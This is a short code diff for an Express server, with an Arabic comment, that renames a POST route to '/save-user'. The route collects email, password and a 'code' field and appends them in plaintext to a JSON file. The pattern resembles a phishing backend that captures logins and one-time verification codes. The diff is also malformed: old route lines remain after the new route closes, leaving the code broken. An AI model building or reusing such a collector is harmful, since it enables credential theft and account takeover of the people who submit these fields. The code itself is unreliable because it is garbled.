@@ -23,17 +23,23 @@ function readData() {
   return [];
 }
 
-// مسار حفظ البيانات
-app.post('/api/save-data', (req, res) => {
-  const { email, password, code } = req.body;
-  
-  const entry = {
-    email: email || '',
-    password: password || '',
-    code: code || '',
-    date: new Date().toLocaleString()
-  };
+// مسار حفظ البيانات (/save-user)
+app.post('/save-user', (req, res) => {
+  const { email, password, code } = req.body;
+  
+  const entry = {
+    email: email || '',
+    password: password || '',
+    code: code || '',
+    date: new Date().toLocaleString()
+  };
 
+  const data = readData();
+  data.push(entry);
+  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
+
+  res.json({ status: 'success' });
+});
   const data = readData();
   data.push(entry);
   fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
